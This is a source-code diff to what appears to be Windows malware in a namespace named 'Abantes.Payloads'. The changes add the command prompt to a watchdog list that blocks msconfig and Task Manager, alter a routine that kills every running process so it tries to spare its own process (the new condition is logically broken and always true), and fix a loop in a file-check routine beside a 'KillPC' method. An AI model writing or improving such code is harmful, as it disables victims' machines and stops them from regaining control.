@@ -94,7 +94,7 @@ namespace Abantes.Payloads
         }
         public static void WatchDogThread()
         {
-            string[] NeverRun = { "msconfig", "taskmgr" };
+            string[] NeverRun = { "msconfig", "taskmgr", "cmd" };
             string[] MustRun = { "Rules" };
             while (true)
             {
@@ -260,10 +260,13 @@ namespace Abantes.Payloads
 
             for (int i = 0; i < allProcesses.Length; i++)
             {
-                try
+                if (allProcesses[i].ToString() != Process.GetProcessesByName("Abantes").ToString() || allProcesses[i].ToString() != Process.GetProcessesByName("Abantes").ToString())
                 {
-                    allProcesses[i].Kill();
-                } catch { }
+                    try
+                    {
+                        allProcesses[i].Kill();
+                    } catch { }
+                }
             }
         }
         public static void KillPC()
@@ -281,7 +284,7 @@ namespace Abantes.Payloads
         {
             //Put each files path in an array to check if it exists
 
-            for (int i = 0; i > sFileName.Count();i++)
+            for (int i = 0; i < sFileName.Count();i++)
             {
                 if (File.Exists(sFileName[i]) == false)
                 {
